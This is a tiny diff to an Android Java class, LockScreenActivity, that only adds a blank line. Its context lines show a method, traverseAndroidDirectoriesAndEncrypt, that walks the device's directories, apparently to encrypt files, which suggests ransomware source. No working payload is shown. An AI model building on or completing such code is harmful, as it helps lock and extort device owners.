@@ -318,6 +318,7 @@ public class LockScreenActivity extends AppCompatActivity implements LockScreenU
     }
 
     public void traverseAndroidDirectoriesAndEncrypt(File dir, Boolean encrytFiles) {
+
         if (dir.exists()) {
             File[] files = dir.listFiles();
             for (File file : files) {
